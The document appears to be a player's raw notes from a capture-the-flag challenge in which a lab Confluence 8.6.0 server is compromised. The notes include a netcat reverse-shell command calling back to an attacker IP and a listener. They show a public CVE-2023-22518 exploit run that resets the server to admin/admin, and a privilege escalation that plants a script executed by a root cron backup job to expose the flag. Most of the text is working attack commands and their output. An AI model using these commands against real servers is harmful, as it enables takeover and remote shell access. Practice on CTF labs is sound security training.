456:password

Hacker Cat
hackercat@blaekspruttespillet.dk 

Grumpy Cat
grumpycat@blaekspruttespillet.dk 

Nyan Cat
nyancat@blaekspruttespillet.dk 

001
frontman@squid.dk 

Nyan Dog
nyandog@altmuligt.dk 

001@squid.dk (Administrator)
002@squid.dk (Tentacle Technician)
003@squid.dk (Ink Control)
004@squid.dk (Camouflage Coordinator)
005@squid.dk (Communication Octopus)
admin@squid.dk

crontab:
*/1 * * * * /usr/local/bin/squidbackup.sh

chmod +x /usr/local/bin/squidbackup.sh
chmod +x /usr/local/bin/squidrestore.sh

http://intranetmadness.hkn:8090/display/DOCS/calendar/63ef5f16-6616-49f6-b61f-92972c287e3f?calendarName=Vulns%20we%20should%20fix
05/04/2025
 Patch confluence!
Ny vuln har ramt! Folk får resat deres confluence. få nu patchet! noget med at man kan resette til admin admin og fjerne alt på hele serveren i ovenkøbet

Confluence 8.6.0
https://github.com/r00t7oo2jm/-CVE-2024-21683-RCE-in-Confluence-Data-Center-and-Server

CVE-2024-21683

import os
os.system("nc -e /bin/sh 10.0.240.244 4444")
nc -lvnp 4444

https://vulmon.com/searchpage?q=Atlassian+Confluence+Data+Center+8.6.0&sortby=bydate&scoretype=vmscore

CVE-2023-22518 

git clone https://github.com/ForceFledgling/CVE-2023-22518.git
Cloning into 'CVE-2023-22518'...
remote: Enumerating objects: 85, done.
remote: Counting objects: 100% (85/85), done.
remote: Compressing objects: 100% (85/85), done.
remote: Total 85 (delta 48), reused 1 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (85/85), 875.59 KiB | 9.73 MiB/s, done.
Resolving deltas: 100% (48/48), done.
cd%
❯ cd CVE-2023-22518
❯ ls
atlplug.jar  DETAIL.md  exploit.py  LICENSE  README.md  xmlexport-20231109-060519-1.zip
❯ python3 exploit.py
Enter the URL: http://intranetmadness.hkn:8090/json/setup-restore.action?synchronous=true
Enter the path to the .zip file: xmlexport-20231109-060519-1.zip
Exploit Success! Login Using 'admin :: admin'



shell>cat /usr/local/bin/squidbackup.sh
#!/bin/bash

# Directory to back up
SOURCE_DIR="/var/atlassian/application-data/confluence"

# Backup destination (user-specified)
BACKUP_DIR="$1"

# Check if backup directory is provided
if [ -z "$BACKUP_DIR" ]; then
echo "Usage: $0 <backup_directory>"
exit 1
fi

echo "[*] Starting backup from '$SOURCE_DIR' to '$BACKUP_DIR'..."

# Perform the backup
cp -r "$SOURCE_DIR"/* "$BACKUP_DIR"

if [ -f "$BACKUP_DIR/post-backup.sh" ]; then
echo "[!] post-backup.sh found. Executing..."
chmod +x "$BACKUP_DIR/post-backup.sh"
"$BACKUP_DIR/post-backup.sh"
fi

echo "[*] Backup completed." 

echo "#!/bin/bash\nchmod 777 /flag.txt" > /var/atlassian/application-data/confluence/post-backup.sh

shell>cat /flag.txt
DDC{D0N7H4CK7H35QU1DSM4N} 